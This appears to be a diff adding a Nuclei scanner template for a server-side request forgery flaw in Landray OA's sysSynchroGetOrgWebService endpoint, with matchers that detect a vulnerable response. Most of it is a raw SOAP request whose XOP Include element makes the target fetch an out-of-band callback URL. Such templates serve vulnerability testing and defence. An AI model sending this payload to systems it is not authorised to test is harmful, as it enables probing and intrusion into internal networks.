@@ -1,0 +1,55 @@
+id: landray-syssynchrogetorgwebservice-ssrf
+info:
+  name: 蓝凌OA sysSynchroGetOrgWebService SSRF漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,dnslog
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /sys/webservice/sysSynchroGetOrgWebService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://out.webservice.organization.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getOrgStaffingLevelInfo>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://{{reverse}}"/></count>
+                </arg0>
+            </web:getOrgStaffingLevelInfo>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "意外的文本"
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"(.*?)\"/>"
